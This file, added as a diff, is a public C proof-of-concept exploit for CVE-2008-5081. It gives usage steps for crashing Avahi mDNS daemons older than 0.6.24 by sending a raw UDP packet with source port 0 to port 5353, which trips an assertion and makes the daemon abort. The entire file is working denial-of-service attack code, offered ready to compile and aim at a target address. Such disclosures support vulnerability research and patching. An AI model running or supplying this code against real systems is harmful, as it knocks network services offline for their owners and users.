@@ -1,0 +1,85 @@
+/*
+ * cve-2008-5081.c
+ *
+ * Avahi mDNS Daemon Remote DoS < 0.6.24
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Usage:
+ *
+ *   gcc cve-2008-5081.c -ldnet -o cve-2008-5081
+ *   ./cve-2008-5081 1.2.3.4
+ *  
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5081
+ *    
+ *   Crafted mDNS packet with source port 0 can cause avahi-daemon  
+ *   to abort() due to failed assertion assert(port > 0); in  
+ *   originates_from_local_legacy_unicast_socket() function in
+ *   avahi-core/server.c.
+ *
+ */
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dnet.h>
+ 
+int
+main(int argc, char **argv)
+{
+    ip_t *sock;
+    intf_t *intf;
+    struct addr dst;
+    struct ip_hdr *ip;
+    struct udp_hdr *udp;
+    struct intf_entry entry;
+    int len = IP_HDR_LEN + UDP_HDR_LEN;
+    char buf[len];
+ 
+    if (argc < 2 || addr_aton(argv[1], &dst)) {  
+        printf("error: please specify a target ip address\n");
+        return 1;
+    }
+ 
+    memset(buf, 0, sizeof(buf));
+ 
+    ip = (struct ip_hdr *) buf;
+    ip->ip_v = 4;
+    ip->ip_hl = 5;
+    ip->ip_tos = 0;
+    ip->ip_off = 0;
+    ip->ip_sum = 0;
+    ip->ip_ttl = IP_TTL_MAX;
+    ip->ip_p = IP_PROTO_UDP;
+    ip->ip_id = htons(0xdead);
+    ip->ip_len = htons(len);
+ 
+    udp = (struct udp_hdr *) (buf + IP_HDR_LEN);
+    
+    udp->uh_sum = 0;
+    udp->uh_sport = htons(0);
+    udp->uh_dport = htons(5353);
+    udp->uh_ulen = htons(UDP_HDR_LEN);
+ 
+    intf = intf_open();
+    intf_get_dst(intf, &entry, &dst);
+    intf_close(intf);
+ 
+    ip->ip_src = entry.intf_addr.addr_ip;
+    ip->ip_dst = dst.addr_ip;
+    ip_checksum(buf, len);
+ 
+    sock = ip_open();
+    if (!sock) {
+        printf("error: root privileges needed for raw socket\n");
+        return 1;
+    }
+    ip_send(sock, buf, len);
+    ip_close(sock);
+ 
+    return 0;
+}
+
+// milw0rm.com [2008-12-19]
